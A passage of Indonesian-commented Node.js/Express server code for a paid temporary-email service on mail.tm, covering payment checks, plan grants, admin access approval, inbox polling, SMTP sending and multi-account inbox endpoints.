    return res.json({ valid: false, message: 'Gagal generate invoice: ' + e.message });
  }
});

// ── 11. Cek pembayaran & aktivasi otomatis ─────────────────────
app.get('/api/email/check-payment', async (req, res) => {
  const { invoice_id } = req.query;
  if (!invoice_id) return res.json({ valid: false, message: 'invoice_id required' });

  try {
    const statusRes = await axios.get(
      `https://app.xentrapay.xyz/api/invoice/status?apikey=${XENTRA_API_KEY}&invoice_id=${invoice_id}`
    );

    if (statusRes.data.status === 'paid') {
      const pendingFile = './pending_email_plans.json';
      let pending = [];
      if (fs.existsSync(pendingFile)) pending = JSON.parse(fs.readFileSync(pendingFile, 'utf8'));

      const idx = pending.findIndex(p => p.invoice_id === invoice_id);
      if (idx !== -1) {
        const data = pending[idx];
        const plan = EMAIL_PLANS[data.plan];

        const subs = loadEmailSubs();
        const expiredAt = new Date(Date.now() + 30 * 86400000).toISOString();
        subs[data.username] = {
          plan: data.plan,
          activatedAt: new Date().toISOString(),
          expiredAt,
          invoice_id
        };
        saveEmailSubs(subs);

        pending.splice(idx, 1);
        fs.writeFileSync(pendingFile, JSON.stringify(pending, null, 2));
        fs.appendFileSync('email_transactions.log',
          `[${new Date().toISOString()}] ${data.username} bought ${plan.name} Rp${plan.price} | invoice=${invoice_id}\n`
        );

        if (wsClients[data.username]) {
          wsClients[data.username].send(JSON.stringify({
            type: 'email:plan:activated',
            plan: plan.name,
            expiredAt
          }));
        }

        return res.json({
          valid: true, status: 'paid', activated: true,
          plan: plan.name, expiredAt,
          message: `✅ Paket ${plan.name} aktif sampai ${expiredAt.slice(0,10)}`
        });
      }
    }

    return res.json({
      valid: true,
      status: statusRes.data.status,
      activated: false,
      message: statusRes.data.status === 'pending' ? '⏳ Menunggu pembayaran...' : 'Status: ' + statusRes.data.status
    });
  } catch (e) {
    return res.json({ valid: false, message: e.message });
  }
});

// ── 12. Admin grant plan manual ────────────────────────────────
app.post('/api/email/admin/grant-plan', express.json(), (req, res) => {
  const { key, targetUser, planCode, days } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || !['owner', 'dev'].includes(admin.role)) {
    return res.status(403).json({ valid: false, message: 'Owner only' });
  }

  const plan = EMAIL_PLANS[planCode];
  if (!plan) return res.json({ valid: false, message: 'Plan invalid' });

  const subs = loadEmailSubs();
  const expiredAt = new Date(Date.now() + (days || 30) * 86400000).toISOString();
  subs[targetUser] = {
    plan: planCode,
    activatedAt: new Date().toISOString(),
    expiredAt,
    grantedBy: keyInfo.username
  };
  saveEmailSubs(subs);

  console.log(`[💰 GRANT] ${keyInfo.username} → ${targetUser}: ${plan.name} (${days || 30}d)`);
  return res.json({ valid: true, plan: plan.name, expiredAt });
});

console.log('[📧 EMAIL] 12 endpoints registered: /api/email/*');

// ══════════════════════════════════════════════════════════════
// EMAIL AUTO-POLL — Unified + Whitelist check
// ══════════════════════════════════════════════════════════════
let lastPolledMessageIds = {};

setInterval(async () => {
  try {
    const db = loadEmailDB();

    for (const [username, emails] of Object.entries(db)) {
      if (!wsClients[username]) continue;

      // Skip kalau user gak punya akses
      const access = canAccessEmail(username);
      if (!access.allowed) continue;

      const newMessages = [];

      for (const acc of emails) {
        try {
          const token = await ensureMailToken(acc);
          const msgs = await mailtm_listMessages(token);

          for (const m of msgs) {
            if (m.seen) continue;
            const cacheKey = `${acc.address}:${m.id}`;
            if (lastPolledMessageIds[cacheKey]) continue;
            lastPolledMessageIds[cacheKey] = true;

            newMessages.push({
              accountAddress: acc.address,
              id: m.id,
              from: m.from?.address || '-',
              fromName: m.from?.name || '',
              subject: m.subject || '(no subject)',
              intro: m.intro || '',
              createdAt: m.createdAt
            });
          }
        } catch (_) {}
      }

      if (newMessages.length > 0) {
        wsClients[username].send(JSON.stringify({
          type: 'email:new',
          totalNew: newMessages.length,
          messages: newMessages.slice(0, 5),
          message: `📬 ${newMessages.length} email baru masuk ke ${newMessages.length === 1 ? newMessages[0].accountAddress : newMessages.length + ' akun'}`
        }));

        for (const msg of newMessages) {
          wsClients[username].send(JSON.stringify({
            type: 'email:new:detail',
            accountAddress: msg.accountAddress,
            from: msg.from,
            subject: msg.subject,
            message: `Email baru di ${msg.accountAddress.split('@')[0]}`
          }));
        }

        console.log(`[📬 POLL] ${username} → ${newMessages.length} email baru`);
      }
    }

    if (Object.keys(lastPolledMessageIds).length > 5000) {
      lastPolledMessageIds = {};
    }

    saveEmailDB(db);
  } catch (e) {
    console.error('[EMAIL POLL] error:', e.message);
  }
}, EMAIL_POLL_MS);

console.log(`[📬 EMAIL] Unified auto-poll aktif setiap ${EMAIL_POLL_MS / 1000}s`);

//═══════════════════════════════════════════════════════════
// EMAIL AUTO-CLEANUP — hapus email expired tiap 1 jam
// ══════════════════════════════════════════════════════════════
setInterval(async () => {
  try {
    const db = loadEmailDB();
    const now = Date.now();
    let changed = false, removed = 0;

    for (const [username, emails] of Object.entries(db)) {
      const active = [];
      for (const acc of emails) {
        const expireAt = acc.expireAt ? new Date(acc.expireAt).getTime() : Infinity;
        if (expireAt > now) active.push(acc);
        else {
          mailtm_deleteAccount(acc.token, acc.accountId).catch(() => {});
          removed++;
        }
      }
      if (active.length !== emails.length) {
        db[username] = active;
        changed = true;
      }
    }
    if (changed) {
      saveEmailDB(db);
      console.log(`[🧹 CLEANUP] ${removed} email expired dihapus`);
    }
  } catch (e) {
    console.error('[EMAIL CLEANUP]', e.message);
  }
}, 3600000);

console.log('[🧹 EMAIL] Auto-cleanup aktif (interval 1 jam)');

// ══════════════════════════════════════════════════════════════
// EMAIL ACCESS — Endpoints (Whitelist Approval)
// ══════════════════════════════════════════════════════════════

// 1. User cek status akses lo
app.get('/api/email/access-status', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const status = canAccessEmail(keyInfo.username);
  const access = loadEmailAccess();
  const entry = access[keyInfo.username];

  return res.json({
    valid: true,
    username: keyInfo.username,
    allowed: status.allowed,
    status: entry?.status || 'not_approved',
    reason: status.reason || null,
    message: status.message || null,
    requestedAt: entry?.requestedAt || null,
    setAt: entry?.setAt || null
  });
});

// 2. User request akses
app.post('/api/email/request-access', express.json(), (req, res) => {
  const { key } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const existing = canAccessEmail(keyInfo.username);
  if (existing.allowed) {
    return res.json({ valid: true, alreadyAllowed: true, message: 'Lo udah punya akses.' });
  }

  const access = loadEmailAccess();
  const entry = access[keyInfo.username];
  if (entry?.status === 'banned' || entry?.status === 'rejected') {
    return res.json({
      valid: false,
      message: entry.status === 'banned'
        ? 'Akun lo di-ban. Hubungi Dev.'
        : 'Request lo ditolak. Hubungi Dev.'
    });
  }

  requestEmailAccess(keyInfo.username);
  console.log(`[🔐 REQUEST] ${keyInfo.username} minta akses email`);

  // Notif ke Dev/Owner via WebSocket
  const db = loadDatabase();
  const devs = db.filter(u => ['dev', 'owner'].includes((u.role || '').toLowerCase()));
  for (const dev of devs) {
    if (wsClients[dev.username]) {
      wsClients[dev.username].send(JSON.stringify({
        type: 'email:access:request',
        username: keyInfo.username,
        message: `🔔 ${keyInfo.username} minta akses fitur email`
      }));
    }
  }

  return res.json({
    valid: true,
    status: 'pending',
    message: 'Request terkirim. Tunggu approval Dev.'
  });
});

// 3. Dev: list semua user + status akses
app.get('/api/email/access-list', (req, res) => {
  const { key, filter } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || !['dev', 'owner'].includes((admin.role || '').toLowerCase())) {
    return res.status(403).json({ valid: false, message: 'Khusus Dev/Owner' });
  }

  const access = loadEmailAccess();
  let list = db.map(u => ({
    username: u.username,
    role: u.role || 'member',
    status: access[u.username]?.status || 'not_approved',
    requestedAt: access[u.username]?.requestedAt || null,
    setAt: access[u.username]?.setAt || null,
    setBy: access[u.username]?.setBy || null
  }));

  if (filter && filter !== 'all') {
    list = list.filter(u => u.status === filter);
  }

  list.sort((a, b) => {
    if (a.status === 'pending' && b.status !== 'pending') return -1;
    if (a.status !== 'pending' && b.status === 'pending') return 1;
    return 0;
  });

  return res.json({
    valid: true,
    total: list.length,
    pendingCount: list.filter(u => u.status === 'pending').length,
    approvedCount: list.filter(u => u.status === 'approved').length,
    users: list
  });
});

// 4. Dev: approve/reject/ban user
app.post('/api/email/access-set', express.json(), (req, res) => {
  const { key, targetUser, status } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || !['dev', 'owner'].includes((admin.role || '').toLowerCase())) {
    return res.status(403).json({ valid: false, message: 'Khusus Dev/Owner' });
  }

  const validStatuses = ['approved', 'pending', 'rejected', 'banned', 'not_approved'];
  if (!validStatuses.includes(status)) {
    return res.status(400).json({ valid: false, message: 'Status tidak valid' });
  }

  const target = db.find(u => u.username === targetUser);
  if (!target) return res.json({ valid: false, message: 'User tidak ditemukan' });

  if (['owner', 'dev'].includes((target.role || '').toLowerCase()) && targetUser !== keyInfo.username) {
    return res.status(403).json({ valid: false, message: 'Gak bisa ubah akses sesama Dev/Owner' });
  }

  if (status === 'not_approved') {
    const access = loadEmailAccess();
    delete access[targetUser];
    saveEmailAccess(access);
  } else {
    setEmailAccess(targetUser, status, keyInfo.username);
  }

  console.log(`[🔐 ACCESS SET] ${keyInfo.username} → ${targetUser}: ${status}`);

  if (wsClients[targetUser]) {
    const messages = {
      approved: '✅ Akses email lo udah di-approve!',
      rejected: '❌ Request akses email lo di-reject.',
      banned: '🚫 Lo di-ban dari fitur email.',
      pending: '⏳ Akses lo masih dalam review.'
    };
    wsClients[targetUser].send(JSON.stringify({
      type: 'email:access:update',
      status,
      message: messages[status] || `Status akses: ${status}`
    }));
  }

  return res.json({ valid: true, targetUser, status });
});

// 5. Dev: bulk approve
app.post('/api/email/access-bulk-approve', express.json(), (req, res) => {
  const { key, usernames } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || !['dev', 'owner'].includes((admin.role || '').toLowerCase())) {
    return res.status(403).json({ valid: false, message: 'Khusus Dev/Owner' });
  }

  if (!Array.isArray(usernames) || !usernames.length) {
    return res.status(400).json({ valid: false, message: 'usernames wajib array' });
  }

  let approved = 0;
  for (const u of usernames) {
    const target = db.find(x => x.username === u);
    if (!target) continue;
    setEmailAccess(u, 'approved', keyInfo.username);
    approved++;

    if (wsClients[u]) {
      wsClients[u].send(JSON.stringify({
        type: 'email:access:update',
        status: 'approved',
        message: '✅ Akses email lo udah di-approve!'
      }));
    }
  }

  console.log(`[🔐 BULK APPROVE] ${keyInfo.username} → ${approved} user`);
  return res.json({ valid: true, approved });
});

// 6. Dev: grant akses + plan sekaligus
app.post('/api/email/access-grant', express.json(), (req, res) => {
  const { key, targetUser, planCode, days } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || !['dev', 'owner'].includes((admin.role || '').toLowerCase())) {
    return res.status(403).json({ valid: false, message: 'Khusus Dev/Owner' });
  }

  const plan = EMAIL_PLANS[planCode];
  if (!plan) return res.json({ valid: false, message: 'Plan invalid' });

  setEmailAccess(targetUser, 'approved', keyInfo.username);

  const subs = loadEmailSubs();
  const expiredAt = new Date(Date.now() + (days || 30) * 86400000).toISOString();
  subs[targetUser] = {
    plan: planCode,
    activatedAt: new Date().toISOString(),
    expiredAt,
    grantedBy: keyInfo.username
  };
  saveEmailSubs(subs);

  console.log(`[🔐+💰 GRANT] ${keyInfo.username} → ${targetUser}: ${plan.name} (${days || 30}d)`);

  if (wsClients[targetUser]) {
    wsClients[targetUser].send(JSON.stringify({
      type: 'email:access:update',
      status: 'approved',
      plan: plan.name,
      expiredAt,
      message: `🎉 Akses email di-approve! Paket: ${plan.name}`
    }));
  }

  return res.json({ valid: true, targetUser, plan: plan.name, expiredAt });
});

console.log('[🔐 EMAIL ACCESS] 6 endpoints registered');

// ══════════════════════════════════════════════════════════════
// EMAIL ENDPOINTS — Full Suite (dengan whitelist check)
// ══════════════════════════════════════════════════════════════

// ── 1. Buat email temp baru ────────────────────────────────────
app.post('/api/email/create-temp', express.json(), async (req, res) => {
  const { key, username, customName } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  // 🔐 WHITELIST CHECK
  const accessStatus = canAccessEmail(keyInfo.username);
  if (!accessStatus.allowed) {
    return res.status(403).json({
      valid: false, accessRequired: true,
      status: accessStatus.reason, message: accessStatus.message
    });
  }

  const quota = checkEmailQuota(keyInfo.username);
  if (!quota.ok) {
    return res.status(403).json({
      valid: false, message: quota.reason,
      currentPlan: getEmailPlan(keyInfo.username).plan,
      upgradeRequired: true
    });
  }

  if (!checkEmailRate(keyInfo.username)) {
    return res.status(429).json({ valid: false, message: 'Rate limit: max 10 email/menit' });
  }

  try {
    const domains = await mailtm_getDomains();
    if (!domains.length) return res.json({ valid: false, message: 'No domain available' });

    const domain = domains[Math.floor(Math.random() * domains.length)].domain;
    const local = (customName || username || keyInfo.username || 'user')
      .toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 15) + Math.floor(Math.random() * 99999);
    const address = `${local}@${domain}`;
    const password = crypto.randomBytes(10).toString('hex');

    const acc = await mailtm_createAccount(address, password);
    const token = await mailtm_getToken(address, password);

    const db = loadEmailDB();
    if (!db[keyInfo.username]) db[keyInfo.username] = [];
    db[keyInfo.username].push({
      address, password, accountId: acc.id, token,
      provider: 'mail.tm', label: null,
      createdAt: new Date().toISOString(),
      expireAt: new Date(Date.now() + quota.plan.retentionDays * 86400000).toISOString()
    });
    saveEmailDB(db);

    if (!getActiveEmail(keyInfo.username)) {
      setActiveEmail(keyInfo.username, address);
    }

    console.log(`[📧 CREATE] ${keyInfo.username} [${quota.plan.plan}] → ${address}`);
    return res.json({
      valid: true, address, password,
      plan: quota.plan.plan,
      quotaUsed: quota.used + 1,
      quotaMax: quota.plan.maxEmails,
      expireAt: db[keyInfo.username].slice(-1)[0].expireAt
    });
  } catch (e) {
    console.error('[EMAIL] create-temp error:', e.message);
    return res.json({ valid: false, message: e.message });
  }
});

// ── 2. List semua email user ───────────────────────────────────
app.get('/api/email/list', (req, res) => {
  const key = req.query.key;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const db = loadEmailDB();
  const list = (db[keyInfo.username] || []).map(e => ({
    address: e.address, provider: e.provider,
    label: e.label || null,
    createdAt: e.createdAt, expireAt: e.expireAt
  }));
  return res.json({ valid: true, emails: list });
});

// ── 3. Baca inbox ──────────────────────────────────────────────
app.get('/api/email/inbox', async (req, res) => {
  const { key, address } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  // 🔐 WHITELIST CHECK
  const accessStatus = canAccessEmail(keyInfo.username);
  if (!accessStatus.allowed) {
    return res.status(403).json({
      valid: false, accessRequired: true,
      status: accessStatus.reason, message: accessStatus.message
    });
  }

  const db = loadEmailDB();
  const userAccounts = db[keyInfo.username] || [];
  const targetAddress = address || getActiveEmail(keyInfo.username);

  if (!targetAddress) {
    return res.json({ valid: false, message: 'Belum ada email aktif. Bikin dulu.' });
  }

  const acc = userAccounts.find(e => e.address === targetAddress);
  if (!acc) return res.json({ valid: false, message: 'Email not found' });

  try {
    const token = await ensureMailToken(acc);
    saveEmailDB(db);
    const messages = await mailtm_listMessages(token);
    return res.json({
      valid: true,
      address: acc.address,
      isActive: acc.address === getActiveEmail(keyInfo.username),
      count: messages.length,
      unseen: messages.filter(m => !m.seen).length,
      messages: messages.map(m => ({
        id: m.id, from: m.from?.address || '-', fromName: m.from?.name || '',
        subject: m.subject || '(no subject)', intro: m.intro || '',
        seen: !!m.seen, hasAttachments: !!m.hasAttachments, createdAt: m.createdAt
      }))
    });
  } catch (e) {
    return res.json({ valid: false, message: e.message });
  }
});

// ── 4. Baca isi pesan ──────────────────────────────────────────
app.get('/api/email/read', async (req, res) => {
  const { key, address, id } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const db = loadEmailDB();
  const acc = (db[keyInfo.username] || []).find(e => e.address === address);
  if (!acc) return res.json({ valid: false, message: 'Email not found' });

  try {
    const token = await ensureMailToken(acc);
    saveEmailDB(db);
    const msg = await mailtm_readMessage(token, id);
    return res.json({
      valid: true, id: msg.id,
      from: msg.from?.address || '-', fromName: msg.from?.name || '',
      to: (msg.to || []).map(t => t.address).join(', '),
      cc: (msg.cc || []).map(t => t.address).join(', '),
      subject: msg.subject || '(no subject)',
      text: msg.text || '',
      html: Array.isArray(msg.html) ? msg.html.join('') : (msg.html || ''),
      attachments: (msg.attachments || []).map(a => ({
        filename: a.filename, size: a.size,
        contentType: a.contentType, downloadUrl: a.downloadUrl
      })),
      createdAt: msg.createdAt
    });
  } catch (e) {
    return res.json({ valid: false, message: e.message });
  }
});

// ── 5. Hapus email ─────────────────────────────────────────────
app.post('/api/email/delete', express.json(), (req, res) => {
  const { key, address, hard } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const db = loadEmailDB();
  const list = db[keyInfo.username] || [];
  const acc = list.find(e => e.address === address);
  if (!acc) return res.json({ valid: false, message: 'Not found' });

  if (hard && acc.accountId) {
    mailtm_deleteAccount(acc.token, acc.accountId).catch(() => {});
  }
  db[keyInfo.username] = list.filter(e => e.address !== address);
  saveEmailDB(db);
  return res.json({ valid: true, message: 'Deleted' });
});

// ── 6. Kirim email via SMTP ────────────────────────────────────
app.post('/api/email/send', express.json(), async (req, res) => {
  const { key, smtp, to, subject, body, html } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const plan = getEmailPlan(keyInfo.username);
  if (!plan.smtpSend) {
    return res.status(403).json({ valid: false, message: 'Fitur SMTP butuh paket Pro ke atas', upgradeRequired: true });
  }

  if (!smtp?.host || !smtp?.user || !smtp?.pass || !to || !subject) {
    return res.json({ valid: false, message: 'Missing fields (host, user, pass, to, subject)' });
  }

  try {
    const transporter = nodemailer.createTransport({
      host: smtp.host, port: smtp.port || 587,
      secure: smtp.secure === true || smtp.port === 465,
      auth: { user: smtp.user, pass: smtp.pass }
    });
    const info = await transporter.sendMail({
      from: smtp.from || smtp.user, to, subject,
      text: body || '', html: html || undefined
    });
    console.log(`[📤 SEND] ${keyInfo.username} → ${to}`);
    return res.json({ valid: true, messageId: info.messageId, accepted: info.accepted });
  } catch (e) {
    console.error('[EMAIL] send error:', e.message);
    return res.json({ valid: false, message: e.message });
  }
});

// ── 7. Statistik email user ────────────────────────────────────
app.get('/api/email/stats', async (req, res) => {
  const key = req.query.key;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadEmailDB();
  const list = db[keyInfo.username] || [];
  let totalMsgs = 0, totalUnseen = 0;
  for (const acc of list) {
    try {
      const token = await ensureMailToken(acc);
      const msgs = await mailtm_listMessages(token);
      totalMsgs += msgs.length;
      totalUnseen += msgs.filter(m => !m.seen).length;
    } catch (_) {}
  }
  saveEmailDB(db);
  return res.json({
    valid: true,
    accounts: list.length,
    totalMessages: totalMsgs,
    totalUnseen,
    plan: getEmailPlan(keyInfo.username).plan
  });
});

// ── 8. Daftar paket ────────────────────────────────────────────
app.get('/api/email/plans', (req, res) => {
  const plans = Object.entries(EMAIL_PLANS).map(([code, p]) => ({
    code, name: p.name, price: p.price,
    priceFormatted: 'Rp ' + p.price.toLocaleString('id-ID'),
    maxEmails: p.maxEmails === -1 ? 'Unlimited' : p.maxEmails,
    maxMessages: p.maxMessages === -1 ? 'Unlimited' : p.maxMessages,
    retentionDays: p.retentionDays,
    features: {
      smtpSend: p.smtpSend, customDomain: p.customDomain,
      apiAccess: p.apiAccess, reseller: p.reseller
    }
  }));
  return res.json({ valid: true, plans });
});

// ── 9. Plan aktif user ─────────────────────────────────────────
app.get('/api/email/my-plan', (req, res) => {
  const key = req.query.key;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const plan = getEmailPlan(keyInfo.username);
  const db = loadEmailDB();
  const userEmails = db[keyInfo.username] || [];

  return res.json({
    valid: true, plan: plan.plan, planName: plan.name, expiredAt: plan.expiredAt,
    quota: {
      emailUsed: userEmails.length,
      emailMax: plan.maxEmails === -1 ? 'Unlimited' : plan.maxEmails,
      messageMax: plan.maxMessages === -1 ? 'Unlimited' : plan.maxMessages,
      retentionDays: plan.retentionDays
    },
    features: {
      smtpSend: plan.smtpSend, customDomain: plan.customDomain,
      apiAccess: plan.apiAccess, reseller: plan.reseller
    }
  });
});

// ── 10. Beli paket (manual)
app.post('/api/email/buy-plan', express.json(), (req, res) => {
  return res.json({
    valid: false,
    message: 'Payment otomatis maintenance. Pakai /api/email/manual-pay',
    redirect: '/api/email/manual-pay'
  });
});

// ── 11. Admin grant plan manual ────────────────────────────────
app.post('/api/email/admin/grant-plan', express.json(), (req, res) => {
  const { key, targetUser, planCode, days } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || !['owner', 'dev'].includes(admin.role)) {
    return res.status(403).json({ valid: false, message: 'Owner/Dev only' });
  }

  const plan = EMAIL_PLANS[planCode];
  if (!plan) return res.json({ valid: false, message: 'Plan invalid' });

  const subs = loadEmailSubs();
  const expiredAt = new Date(Date.now() + (days || 30) * 86400000).toISOString();
  subs[targetUser] = {
    plan: planCode,
    activatedAt: new Date().toISOString(),
    expiredAt,
    grantedBy: keyInfo.username
  };
  saveEmailSubs(subs);

  console.log(`[💰 GRANT] ${keyInfo.username} → ${targetUser}: ${plan.name} (${days || 30}d)`);
  return res.json({ valid: true, plan: plan.name, expiredAt });
});

// ══════════════════════════════════════════════════════════════
// EMAIL — Multi-Account Switcher
// ══════════════════════════════════════════════════════════════

app.get('/api/email/accounts', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadEmailDB();
  const accounts = (db[keyInfo.username] || []);
  const activeEmail = getActiveEmail(keyInfo.username);

  const enriched = accounts.map(acc => ({
    address: acc.address, provider: acc.provider,
    label: acc.label || null,
    createdAt: acc.createdAt, expireAt: acc.expireAt,
    isActive: acc.address === activeEmail
  }));

  return res.json({ valid: true, total: enriched.length, active: activeEmail, accounts: enriched });
});

app.post('/api/email/switch', express.json(), (req, res) => {
  const { key, address } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadEmailDB();
  const acc = (db[keyInfo.username] || []).find(e => e.address === address);
  if (!acc) return res.json({ valid: false, message: 'Email tidak ditemukan' });

  setActiveEmail(keyInfo.username, address);
  console.log(`[📧 SWITCH] ${keyInfo.username} → ${address}`);
  return res.json({ valid: true, active: address, message: `Sekarang pakai ${address}` });
});

app.post('/api/email/rename', express.json(), (req, res) => {
  const { key, address, newLabel } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  if (!newLabel || newLabel.length > 30) {
    return res.json({ valid: false, message: 'Label max 30 karakter' });
  }

  const db = loadEmailDB();
  const acc = (db[keyInfo.username] || []).find(e => e.address === address);
  if (!acc) return res.json({ valid: false, message: 'Email tidak ditemukan' });

  acc.label = newLabel;
  saveEmailDB(db);
  return res.json({ valid: true, address, label: newLabel });
});

app.post('/api/email/remove-account', express.json(), async (req, res) => {
  const { key, address, hard } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadEmailDB();
  const list = db[keyInfo.username] || [];
  const acc = list.find(e => e.address === address);
  if (!acc) return res.json({ valid: false, message: 'Email tidak ditemukan' });

  if (hard && acc.accountId) {
    try {
      const token = await ensureMailToken(acc);
      await mailtm_deleteAccount(token, acc.accountId);
    } catch (_) {}
  }

  db[keyInfo.username] = list.filter(e => e.address !== address);
  saveEmailDB(db);

  if (getActiveEmail(keyInfo.username) === address) {
    const remaining = db[keyInfo.username];
    if (remaining.length > 0) {
      setActiveEmail(keyInfo.username, remaining[0].address);
    } else {
      const active = loadActiveEmails();
      delete active[keyInfo.username];
      saveActiveEmails(active);
    }
  }

  console.log(`[📧 REMOVE] ${keyInfo.username} → ${address}`);
  return res.json({ valid: true, message: 'Email dihapus' });
});

app.post('/api/email/remove-all', express.json(), async (req, res) => {
  const { key, hard } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadEmailDB();
  const list = db[keyInfo.username] || [];

  if (hard) {
    for (const acc of list) {
      try {
        const token = await ensureMailToken(acc);
        if (acc.accountId) await mailtm_deleteAccount(token, acc.accountId);
      } catch (_) {}
    }
  }

  db[keyInfo.username] = [];
  saveEmailDB(db);

  const active = loadActiveEmails();
  delete active[keyInfo.username];
  saveActiveEmails(active);

  console.log(`[📧 REMOVE ALL] ${keyInfo.username} → ${list.length} email dihapus`);
  return res.json({ valid: true, removed: list.length });
});

app.get('/api/email/accounts-summary', async (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadEmailDB();
  const list = db[keyInfo.username] || [];
  const activeEmail = getActiveEmail(keyInfo.username);
  const summary = [];
  const batchSize = 5;

  for (let i = 0; i < list.length; i += batchSize) {
    const batch = list.slice(i, i + batchSize);
    const promises = batch.map(async (acc) => {
      try {
        const token = await ensureMailToken(acc);
        const msgs = await mailtm_listMessages(token);
        return {
          address: acc.address, isActive: acc.address === activeEmail,
          label: acc.label || null,
          total: msgs.length, unseen: msgs.filter(m => !m.seen).length,
          lastEmail: msgs[0]?.createdAt || null, error: null
        };
      } catch (e) {
        return {
          address: acc.address, isActive: acc.address === activeEmail,
          label: acc.label || null,
          total: 0, unseen: 0, lastEmail: null, error: e.message
        };
      }
    });
    summary.push(...await Promise.all(promises));
    saveEmailDB(db);
  }

  return res.json({ valid: true, total: summary.length, active: activeEmail, accounts: summary });
});

// ══════════════════════════════════════════════════════════════
// UNIFIED INBOX
// ══════════════════════════════════════════════════════════════

app.get('/api/email/unified-inbox', async (req, res) => {
  const { key, limit } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const accessStatus = canAccessEmail(keyInfo.username);
  if (!accessStatus.allowed) {
    return res.status(403).json({
      valid: false, accessRequired: true,
      status: accessStatus.reason, message: accessStatus.message
    });
  }

  const db = loadEmailDB();
  const userAccounts = db[keyInfo.username] || [];
  if (!userAccounts.length) {
    return res.json({ valid: true, totalAccounts: 0, messages: [] });
  }

  const maxMsgs = Math.min(Math.max(parseInt(limit) || 100, 1), 500);
  const allMessages = [];
  const batchSize = 5;

  for (let i = 0; i < userAccounts.length; i += batchSize) {
    const batch = userAccounts.slice(i, i + batchSize);
    const promises = batch.map(async (acc) => {
      try {
        const token = await ensureMailToken(acc);
        const msgs = await mailtm_listMessages(token);
        return msgs.map(m => ({
          accountAddress: acc.address,
          accountProvider: acc.provider,
          id: m.id, from: m.from?.address || '-', fromName: m.from?.name || '',
          subject: m.subject || '(no subject)', intro: m.intro || '',
          seen: !!m.seen, hasAttachments: !!m.hasAttachments, createdAt: m.createdAt
        }));
      } catch (e) {
        return [];
      }
    });
    const results = await Promise.all(promises);
    results.forEach(r => allMessages.push(...r));
    saveEmailDB(db);
  }

  allMessages.sort((a, b) =>
    new Date(b.createdAt || 0).getTime() - new Date(a.createdAt || 0).getTime()
  );

  const byAccount = {};
  allMessages.forEach(m => {
    if (!byAccount[m.accountAddress]) byAccount[m.accountAddress] = 0;
    byAccount[m.accountAddress]++;
  });

  return res.json({
    valid: true,
    totalAccounts: userAccounts.length,
    totalMessages: allMessages.length,
    unseen: allMessages.filter(m => !m.seen).length,
    perAccount: byAccount,
    messages: allMessages.slice(0, maxMsgs)
  });
});

app.get('/api/email/unified-read', async (req, res) => {
  const { key, accountAddress, id } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadEmailDB();
  const acc = (db[keyInfo.username] || []).find(e => e.address === accountAddress);
  if (!acc) return res.json({ valid: false, message: 'Account not found' });

  try {
    const token = await ensureMailToken(acc);
    saveEmailDB(db);
    const msg = await mailtm_readMessage(token, id);
    return res.json({
      valid: true, accountAddress, id: msg.id,
      from: msg.from?.address || '-',
      to: (msg.to || []).map(t => t.address).join(', '),
      subject: msg.subject || '(no subject)',
      text: msg.text || '',
      html: Array.isArray(msg.html) ? msg.html.join('') : (msg.html || ''),
      createdAt: msg.createdAt
    });
  } catch (e) {
    return res.json({ valid: false, message: e.message });
  }
});

// ══════════════════════════════════════════════════════════════
// EMAIL — Manual Payment (XentraPay mati)
// ══════════════════════════════════════════════════════════════
  app.post('/api/email/manual-pay', express.json(), (req, res) => {
  const { key, planCode, method, senderName, proofUrl } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const plan = EMAIL_PLANS[planCode];
